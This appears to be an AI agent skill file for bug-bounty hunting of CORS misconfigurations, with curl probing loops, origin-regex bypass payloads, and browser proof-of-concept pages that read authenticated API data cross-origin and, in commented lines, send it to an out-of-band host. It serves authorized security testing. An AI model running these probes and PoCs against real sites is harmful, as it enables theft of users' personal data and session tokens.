---
name: hunt-cors
description: Hunt CORS Misconfiguration
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
report_count: 19
sources: hackerone_public
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration

## What actually pays (and what does not)

CORS pays High **only** when an attacker-controlled origin can perform a
**credentialed** cross-origin read of sensitive authenticated data, and you
have a browser PoC proving the response body is readable from `evil.com`.

Two hard browser rules that kill most "findings" — check these FIRST:

- **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**
  If the server returns `ACAO: *`, the browser refuses to send/expose the
  response for a `credentials: include` request. A wildcard-only endpoint is
  **not** credential-exploitable. It is only interesting if the data it serves
  is sensitive *without* a session (rare) — usually this is Informational/Low.
- **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It
  matters only if `ACAO` reflects/allows your specific attacker origin AND a
  cross-origin credentialed `fetch` actually returns a readable body. ACAC on a
  response that does not reflect your origin proves nothing.

If you cannot demonstrate a readable cross-origin authed body in a real
browser, you do not have a High. Do not submit header-diffing alone.

---

## Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see hunt-subdomain).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

## Attack Surface Signals

```
Any endpoint returning an Access-Control-Allow-Origin header
API endpoints:   /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user, /api/session
Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings
Financial:       /api/balance, /api/transactions
Admin/internal:  /api/admin/*, /api/internal/*
```

Prioritize endpoints that (a) require a session cookie and (b) return PII,
tokens, CSRF tokens, or other secrets in the body.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover CORS endpoints
```bash
# Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
# and -I sends HEAD which may be handled differently.
while read url; do
  result=$(curl -s -D - -o /dev/null "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
done < recon/$TARGET/api-endpoints.txt

# httpx bulk check
cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
```

### Phase 2 — Reflect-any-origin + null origin
```bash
# Does the server reflect an arbitrary Origin back?
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable (the High case):
#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
#   Access-Control-Allow-Credentials: true          <- + credentials => readable
#
# NOT exploitable for credentialed theft:
#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
#   (no ACAC, or ACAC absent)                        <- not credentialed

# Null-origin trust
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
```

### Phase 3 — Subdomain / trusted-origin regex bypass
The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |

```bash
# Send each class-specific payload and watch what the server reflects.
for ORIGIN in \
  "https://evil.target.com" \
  "https://eviltarget.com" \
  "https://x.target.com.evil.com" \
  "https://target.com.evil.com" \
  "https://target.com%60.evil.com" \
  "http://target.com"; do
  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
done
```
A bypass is real only if the server reflects **your registerable origin** into
`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomain).

### Phase 3b — Trusted insecure (HTTP) origin
If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
```bash
curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
```
Real only if a MITM can occupy that http origin (no HSTS-preload). Pair with `hunt-tls-network`. (PortSwigger: CORS with trusted insecure protocols.)

### Phase 4 — Pre-flight (OPTIONS) gating bypass
Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple
`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. The browser only sends
the real request if the pre-flight response authorizes the method/header. Two
things to test:

1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**
   If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect
   whatever you ask for, a malicious origin can drive state-changing requests
   (chain to CSRF-style writes that JSON/SameSite would otherwise block).

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
  | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true +
#   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
# => attacker origin can issue authed PUT/DELETE with custom headers.
```

2. **Is the pre-flight even enforced server-side?** Some servers reflect the
   origin on `OPTIONS` but the actual GET/POST also reflects — the read path is
   the bug; the pre-flight just confirms write-path reach. Test the GET/POST
   directly too — never assume the pre-flight result equals the real-request
   result. Confirm in a browser, because curl ignores CORS entirely.

### Phase 5 — Browser PoCs (the only thing that proves impact)
curl does NOT enforce CORS — it will happily show you a reflected header even
when a browser would block the read. **Every CORS High needs a browser PoC.**

**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):
```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.text())
  .then(d => {
    document.getElementById("out").innerText = d;        // prove readable body
    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
  })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```
If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).

**5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
document must lack `allow-same-origin` so its origin is opaque (`null`):
```html
<!doctype html><body>
<!-- Outer page hosted anywhere -->
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://TARGET/api/me", {credentials: "include"})
      .then(r => r.text())
      .then(d => parent.postMessage(d, "*"));
  &lt;/script&gt;'></iframe>
<script>
window.addEventListener("message", e => {
  // d is the authed body, read cross-origin via a null Origin
  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
  console.log("NULL-ORIGIN READ:", e.data);
});
</script></body>
```
(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the
request through a 302 redirect chain whose final hop is cross-scheme.)

**5c. Trusted-subdomain read** — once you control a host that the regex trusts
(real subdomain via takeover, or a registerable origin that matches a buggy
regex from Phase 3), host **5a** there. The reflected origin is now an origin
you legitimately serve, so the browser allows the read.

### Phase 6 — postMessage origin check
```bash
# Find message handlers that don't strictly validate event.origin.
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
  | grep -v "\.origin"
# Then audit each hit: does it check event.origin against an allowlist
# BEFORE using event.data? Weak checks to flag:
#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
#   .endsWith("target.com")          <- "eviltarget.com" passes
#   startsWith("https://target")     <- "https://target.evil.com" passes
#   no check at all
```
postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
client-side auth bypass). See hunt-dom for exploitation depth.

---

## Automation (triage only — never the proof)
```bash
# corsy — fast reflection/null/pre-domain checks
pip3 install corsy
corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"

# nuclei CORS templates
nuclei -u https://$TARGET -t http/misconfiguration/cors/

# Burp: passively flags origin reflection; always re-confirm in a real browser.
```
Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.

---

## Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | hunt-csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | hunt-xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | hunt-subdomain takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | hunt-dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

## Validation discipline (read before submitting)

- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
  Show a screenshot/console log of the authed body read from `evil.com`. If the
  fetch throws / logs `BLOCKED`, you have nothing.
- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
  wildcard if the data is sensitive unauthenticated (then it is usually Low).
- **`ACAC: true` alone proves nothing** — it must pair with your reflected
  origin AND a successful readable cross-origin body.
- **Match the regex class to the payload (Phase 3).** Do not submit
  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
  match and is not a bug.
- **`evil.target.com` reflecting is not automatically a bug** — it is an
  in-scope subdomain by design unless you can actually control it.
- **OOB confirmation** for blind/headless contexts: exfil the read body to a
  Burp Collaborator / oastify host and show the interaction. Use a unique
  per-test marker so the hit is unambiguously yours.
- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
  read to PII, tokens, secrets, or financial data to justify severity.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: High
- Pre-flight authorizes attacker-origin state change on sensitive action: High
- Null-origin + sensitive authed body, browser-proven: Medium–High
- Subdomain-takeover/XSS-assisted credentialed read: High/Critical
- Reflects origin, no credentials / non-sensitive: Low–Informational
- `ACAO: *` only (no creds possible): Informational unless data is secret

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
